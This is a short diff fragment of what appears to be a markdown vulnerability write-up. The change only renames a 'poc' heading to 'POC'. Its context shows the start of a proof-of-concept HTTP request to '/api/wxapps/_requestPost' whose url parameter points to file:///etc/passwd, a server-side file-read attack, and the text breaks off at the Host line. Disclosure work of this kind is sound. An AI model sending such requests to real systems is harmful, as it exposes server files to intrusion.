@@ -8,7 +8,7 @@
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732115890021-a19be87f-f478-4ee9-971e-bdbeb555e80f.png)
 
-## poc
+## POC
 ```java
 GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/2
 Host: 
